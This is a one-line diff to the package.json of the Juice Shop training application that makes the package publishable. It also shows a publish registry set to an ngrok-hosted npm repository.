@@ -1,7 +1,7 @@
 {
   "name": "juice-shop",
   "version": "14.0.1",
-  "private": true,
+  "private": false,
   "description": "Probably the most modern and sophisticated insecure web application",
   "publishConfig": {
     "registry": "https://jbernienxrm.eu.ngrok.io/repository/npm-hosted/"
